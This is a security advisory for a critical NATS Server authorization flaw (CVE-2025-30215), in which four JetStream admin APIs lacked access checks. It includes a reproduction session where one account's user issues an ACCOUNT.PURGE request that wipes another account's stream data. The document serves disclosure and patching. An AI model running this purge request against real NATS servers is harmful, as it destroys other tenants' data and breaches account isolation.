# NATS Server may fail to authorize certain Jetstream admin APIs

**GHSA**: GHSA-fhg8-qxh5-7q3w | **CVE**: CVE-2025-30215 | **Severity**: critical (CVSS 9.6)

**CWE**: CWE-285, CWE-287

**Affected Packages**:
- **github.com/nats-io/nats-server/v2** (go): >= 2.11.0-RC.1, < 2.11.1
- **github.com/nats-io/nats-server/v2** (go): >= 2.2.0, < 2.10.27

## Description

## Advisory

The management of JetStream assets happens with messages in the `$JS.` subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.

Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.

### Affected versions

NATS Server:
 * Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27

-----

## Original Report

(Lightly edited to confirm some supposition and in the summary to use past tense)

### Summary

nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.

In all cases, APIs are not properly restricted to system-account users. Instead, _any_ authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on `$JS.>`.

Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.

Reproduction of the `ACCOUNT.PURGE` case is below. The others are like it.


### Details & Impact

#### Issue 1: `$JS.API.ACCOUNT.PURGE.*`

Any user may perform an account purge of any other account (including their own).

Risk: total destruction of Jetstream configuration and data.


#### Issue 2: `$JS.API.SERVER.REMOVE`

Any user may remove servers from Jetstream clusters.

Risk: Loss of data redundancy, reduction of service quality.


#### Issue 3: `$JS.API.ACCOUNT.STREAM.MOVE.*.*` and `CANCEL_MOVE`

Any user may cause streams to be moved between servers.

Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.

Similarly for `$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*`


#### Mitigations

It appears that users without permission to publish on `$JS.API.ACCOUNT.>` or `$JS.API.SERVER.>` are unable to execute the above APIs.

Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for `$JS.>` (or simply `>`), which allows the improper access to the system APIs above.


#### Scope of impact

Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.

While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.


#### Additional notes

It appears that `$JS.API.META.LEADER.STEPDOWN` does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.



### PoC

#### Environment

Tested with:
nats-server 2.10.26 (installed via homebrew)
nats cli 0.1.6 (installed via homebrew)
macOS 13.7.4


#### Reproduction steps

```
$ nats-server --version
nats-server: v2.10.26

$ nats --version
0.1.6

$ cat nats-server.conf
listen: '0.0.0.0:4233'
jetstream: {
  store_dir: './tmp'
}
accounts: {
  '$SYS': {
    users: [{user: 'sys', password: 'sys'}]
  },
  'TEST': {
    jetstream: true,
    users: [{user: 'a', password: 'a'}]
  },
  'TEST2': {
    jetstream: true,
    users: [{user: 'b', password: 'b'}]
  }
}

$ nats-server -c ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
...

# Authentication is effectively enabled by the server:
$ nats -s nats://localhost:4233 account info
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user sys --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user a --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user b --password wrong
nats: error: setup failed: nats: Authorization Violation

# Valid credentials work, and users properly matched to accounts:
$ nats -s nats://localhost:4233 account info --user sys --password sys
Account Information
                      User: sys
                   Account: $SYS
...

$ nats -s nats://localhost:4233 account info --user a --password a
Account Information
                           User: a
                        Account: TEST
...

$ nats -s nats://localhost:4233 account info --user b --password b
Account Information
                           User: b
                        Account: TEST2
...

# Add a stream and messages to account TEST (user 'a'):
$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
Stream stream1 was created
...

$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"

# Messages are correctly persisted on account TEST, and not on TEST2:
$ nats -s nats://localhost:4233 --user a --password a stream ls
╭───────────────────────────────────────────────────────────────────────────────╮
│                                    Streams                                    │
├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯

$ nats -s nats://localhost:4233 --user b --password b stream ls
No Streams defined

$ du -h tmp/jetstream
  0B	tmp/jetstream/TEST/streams/stream1/obs
8.0K	tmp/jetstream/TEST/streams/stream1/msgs
 16K	tmp/jetstream/TEST/streams/stream1
 16K	tmp/jetstream/TEST/streams
 16K	tmp/jetstream/TEST
 16K	tmp/jetstream

# User b (account TEST2) sends a PURGE command for account TEST (user a).
# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
11:54:50 Received with rtt 1.528042ms
{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}

# From nats-server in response to the purge request:
[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)

# And indeed, the stream data is gone on account TEST:
$ du -h tmp/jetstream
  0B	tmp/jetstream

$ nats -s nats://localhost:4233 --user a --password a stream ls
No Streams defined

```
